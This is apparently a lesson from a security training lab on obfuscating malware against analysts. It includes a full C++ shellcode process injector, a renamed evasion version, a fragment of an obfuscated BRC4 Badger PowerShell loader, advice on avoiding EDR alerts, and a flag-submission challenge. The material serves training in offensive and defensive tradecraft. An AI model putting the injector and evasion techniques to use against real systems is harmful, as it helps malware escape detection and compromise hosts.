# Protecting and Stripping Identifiable Information

Identifiable information can be one of the most critical components an analyst uses to dissect and understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), attackers increase the chances that analysts cannot reconstruct the program's original function.

At a high level, there are three types of identifiable data to consider:

- **Code structure**
- **Object names**
- **File/compilation properties**

This document breaks down the core concepts of each, with practical examples.

---

## Object Names

Object names provide significant insight into a program's functionality and can reveal the purpose of a function. While an analyst can deduce a function's purpose from its behavior, this is much harder without contextual names.

The importance of literal object names depends on the language:

- **Interpreted languages** (e.g., Python, PowerShell): All objects matter and must be modified.
- **Compiled languages** (e.g., C, C#): Only objects appearing in strings are generally significant, often due to IO operations.

The white paper *Layered Obfuscation Taxonomy* summarizes these practices under the code-element layer’s meaningless identifiers method.

### Example: Compiled Language (C++)

Below is a process injector in C++ that reports its status to the command line:

```cpp
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    string leaked = "This was leaked in the strings";

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    cout << "Handle obtained for" << processHandle;
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    cout << "Buffer Created";
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    cout << "Process written with buffer" << remoteBuffer;
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
    cout << "Closing handle" << processHandle;
    cout << leaked;

    return 0;
}
```

#### String Analysis

Running `strings` on the compiled binary reveals leaked identifiers and messages:

```
leaked
shellcode
This was leaked in the strings
Handle obtained for
Buffer Created
Process written with buffer
Closing handle
```

#### Obfuscated Version

By removing comments and replacing meaningful identifiers:

```cpp
#include "windows.h"

int main(int argc, char* argv[])
{
    unsigned char a[] = "";

    HANDLE b;
    HANDLE c;
    PVOID d;

    b = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    d = VirtualAllocEx(b, NULL, sizeof a, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(b, d, a, sizeof a, NULL);
    c = CreateRemoteThread(b, NULL, 0, (LPTHREAD_START_ROUTINE)d, NULL, 0, NULL);
    CloseHandle(b);

    return 0;
}
```

Now, there is no identifiable string information, making the program safer from string analysis.

---

### Example: Interpreted Language (PowerShell)

Below is an obfuscated PowerShell loader (Badger from BRC4 Community Kit):

```powershell
Set-StrictMode -Version 2
[Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
# ... (other byte arrays)
function Get-Robf ($b3tz) {
    $aisN = [System.Byte[]]::new($b3tz.Count)
    for ($x = 0; $x -lt $aisN.Count; $x++) {
       $aisN[$x] = ($b3tz[$x] + 21)
    }
    return [System.Text.Encoding]::ASCII.GetString($aisN)
}
# ... (other functions)
```

Some cmdlets and functions are kept in their original state to avoid raising suspicion or entropy, which could trigger EDR alerts.

---

## Code Structure

Code structure can be problematic if not addressed, as it may lead to signatures or easier reverse engineering. Techniques include:

- **Junk code** and **reordering code**: Add complexity to interpreted programs.
- **Separation of related code**: Randomizes code occurrence to evade heuristic signature engines.

---

## File & Compilation Properties

Minor aspects, such as compilation method, can aid analysts. For example, compiling as a debug build includes symbol files with global/local variables, function names, and entry points.

**Best practices:**

- Compile in **Release** mode.
- Use tools like `strip` to remove symbols from binaries.

Example command to strip symbols:

```sh
strip binaryfile.exe
```

Other properties to consider: entropy, hash, etc.

---

## Challenge

Using the knowledge from this task, remove meaningful identifiers or debug information from the following C++ source code. Compile the obfuscated code using MingW32-G++ and submit it as `challenge-8.exe`.

```cpp
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    string leaked = "This was leaked in the strings";

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    cout << "Handle obtained for" << processHandle;
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    cout << "Buffer Created";
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    cout << "Process written with buffer" << remoteBuffer;
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
    cout << "Closing handle" << processHandle;
    cout << leaked;

    return 0;
}
```

**Note:** The file name must be `challenge-8.exe` to receive the flag.

